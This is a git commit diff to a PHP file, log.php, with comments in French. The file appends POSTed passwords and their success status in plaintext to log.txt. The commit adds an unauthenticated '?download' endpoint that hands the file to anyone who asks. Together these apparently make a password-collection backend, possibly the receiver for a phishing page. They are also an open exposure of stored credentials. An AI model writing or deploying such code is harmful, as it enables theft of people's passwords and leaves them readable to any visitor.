c9a46bf6634fc8efec757d5cfb6d32337460393a
ihamdaouiPerf <issam.hamdaoui@perfaxis.com>
2025-03-12 20:02:42 +0100

    ajouter download

--- log.php
+++ log.php
@@ -1,4 +1,7 @@
 <?php
+
+$file = 'log.txt';
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST["password"];
     $success = $_POST["success"];
@@ -7,4 +10,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $log_entry = "$timestamp - Tentative: $password - Status: $success\n";
     file_put_contents("log.txt", $log_entry, FILE_APPEND);
 }
+
+// Permet le téléchargement du fichier log.txt
+if (isset($_GET['download'])) {
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: text/plain');
+        header('Content-Disposition: attachment; filename="log.txt"');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    } else {
+        echo "Fichier introuvable.";
+    }
+}
+
 ?>
